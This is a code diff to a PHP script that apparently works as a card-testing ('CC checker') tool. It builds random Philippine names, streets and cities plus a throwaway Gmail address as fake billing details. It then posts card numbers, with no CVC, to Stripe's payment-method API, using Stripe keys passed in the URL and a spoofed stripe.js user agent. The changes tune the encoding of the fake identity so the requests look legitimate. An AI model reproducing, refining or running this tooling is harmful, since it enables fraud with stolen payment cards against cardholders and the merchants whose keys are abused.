@@ -25,51 +25,51 @@ $first_names = array(
 $last_names = array(
     "Anderson", "Brown", "Clark", "Davis", "Edwards", "Ford", "Garcia", "Harris", "Irwin", "Jones", "Keller", "Lewis", "Martinez", "Nelson", "O'Brien", "Parker", "Quinn", "Rodriguez", "Smith", "Taylor", "Unger", "Valdez", "Williams", "Xu", "Young", "Zhang"
 );
-$complete_name = $first_names[array_rand($first_names)] . " " . $last_names[array_rand($last_names)];
+$complete_name = $first_names[array_rand($first_names)] . "+" . $last_names[array_rand($last_names)];
 
 $cities = array(
-    'Quezon City',
+    'Quezon+City',
     'Manila',
     'Caloocan',
-    'Davao City',
-    'Cebu City',
-    'Zamboanga City',
+    'Davao+City',
+    'Cebu+City',
+    'Zamboanga+City',
     'Taguig',
     'Pasig',
     'Antipolo',
     'Valenzuela',
-    'Las Pinas',
+    'Las+Piñas',
     'Makati',
     'Marikina',
     'Muntinlupa',
     'Navotas',
-    'Paranaque',
+    'Parañaque',
     'Pasay',
-    'San Juan',
+    'San+Juan',
     'Mandaluyong',
     'Bacoor',
     'Cainta',
-    'San Mateo',
+    'San+Mateo',
     'Imus',
-    'Dasmarinas',
+    'Dasmariñas',
     'Silang',
-    'General Trias',
-    'Trece Martires',
+    'General+Trias',
+    'Trece+Martires',
     'Tagaytay',
-    'Santa Rosa',
-    'Los Banos',
-    'San Pedro',
+    'Santa+Rosa',
+    'Los+Banos',
+    'San+Pedro',
     'Biñan',
     'Calamba',
     'Lipa',
-    'Batangas City',
+    'Batangas+City',
     'Tanauan',
-    'Santo Tomas',
+    'Santo+Tomas',
     'Laguna',
-    'Iloilo City',
-    'Bacolod City',
-    'Cagayan de Oro',
-    'General Santos',
+    'Iloilo+City',
+    'Bacolod+City',
+    'Cagayan+de+Oro',
+    'General+Santos',
     'Iligan',
     'Butuan',
     'Ozamiz',
@@ -82,26 +82,26 @@ $cities = array(
 $random_city = $cities[array_rand($cities)];
 
 $streets = array(
-    "Makati Avenue",
-    "Ayala Avenue",
-    "Buendia Avenue",
+    "Makati+Avenue",
+    "Ayala+Avenue",
+    "Buendia+Avenue",
     "EDSA",
-    "Pasay Road",
-    "Paseo de Roxas",
-    "Gil Puyat Avenue",
-    "Chino Roces Avenue",
-    "Taft Avenue",
-    "Shaw Boulevard",
-    "Ortigas Avenue",
-    "Quezon Avenue",
-    "Commonwealth Avenue",
-    "E. Rodriguez Avenue",
-    "C5 Road",
-    "SLEX",
-    "NLEX",
-    "Roxas Boulevard",
-    "Quirino Avenue",
-    "Araneta Avenue"
+    "Pasay+Road",
+    "Paseo+de+Roxas",
+    "Gil+Puyat+Avenue",
+    "Chino+Roces+Avenue",
+    "Taft+Avenue",
+    "Shaw+Boulevard",
+    "Ortigas+Avenue",
+    "Quezon+Avenue",
+    "Commonwealth+Avenue",
+    "Rodriguez+Avenue",
+    "C5+Road",
+    "Sampaguita+District",
+    "Derederetso+lang",
+    "Roxas+Boulevard",
+    "Quirino+Avenue",
+    "Araneta+Avenue"
 );
 $random_street = $streets[array_rand($streets)];
 
@@ -109,12 +109,12 @@ $sec = $_GET['cslive'];
 $pk = $_GET['pklive'];
 $colink = $_GET['colink'];
 $amt = $_GET['xamount'];
-if(empty($_GET['xemail'])) {
-$email = 'phcaliceschuberg'.rand(000000, 999999).'@gmail.com';
-$xemail = urlencode($email);
+if (empty($_GET['xemail'])) {
+    $email = 'phcaliceschuberg' . rand(000000, 999999) . '@gmail.com';
+    $xemail = str_replace('@', '%40', $email);
 } elseif (!empty($_GET['xemail'])) {
     $email = $_GET['xemail'];
-    $xemail = urlencode($email);
+    $xemail = str_replace('@', '%40', $email);
 }
 
 $hydra = isset($_GET['hydra']) ? $_GET['hydra'] : '';
@@ -288,7 +288,7 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
 curl_setopt($ch, CURLOPT_COOKIESESSION, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]='.urlencode($complete_name).'&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&billing_details[address][line1]='.urlencode($random_street).'&billing_details[address][city]='.urlencode($random_city).'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2F8f6e154302%3B+stripe-js-v3%2F8f6e154302%3B+checkout');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]=&card[exp_month]='.$mm.'&card[exp_year]='.$yyyy.'&billing_details[name]='.$complete_name.'&billing_details[email]='.$xemail.'&billing_details[address][country]=PH&billing_details[address][line1]='.rand(11,99).'+'.$random_street.'&billing_details[address][city]='.$random_city.'&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key='.$pk.'&payment_user_agent=stripe.js%2F1da9d2ae51%3B+stripe-js-v3%2F1da9d2ae51%3B+checkout');
 $pm = curl_exec($ch);
 curl_close($ch);
 $id = g($pm, '"id": "','"');
